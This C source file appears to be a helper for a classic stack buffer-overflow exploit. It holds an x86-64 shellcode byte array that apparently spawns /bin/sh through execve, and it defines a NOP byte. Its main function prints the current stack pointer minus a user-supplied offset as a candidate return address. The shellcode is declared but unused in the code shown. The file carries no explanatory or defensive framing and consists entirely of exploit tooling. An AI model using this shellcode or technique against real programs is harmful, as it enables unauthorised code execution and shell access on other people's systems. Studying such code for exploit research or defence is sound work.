#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_BUFFER_SIZE 64
#define DEFAULT_OFFSET	    0
#define NOP		    0x90


char shellcode[]= \
"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb"
"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
"\x54\x5f\x52\x57\x54\x5e\x0f\x05";

// Function that returns the stack pointer (RSP)
long get_stack_pointer() {
    long sp;
    __asm__ volatile ("mov %%rsp, %0" : "=r" (sp));
    return sp;
}

int main(int argc, char *argv[]) {
    long stack_ptr;
    int buffer_size=DEFAULT_BUFFER_SIZE, offset=DEFAULT_OFFSET;
    
    if (argc > 1) buffer_size = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);
	

    stack_ptr = get_stack_pointer() - offset;
    printf("0x%lx\n", stack_ptr);

    return 0;
}
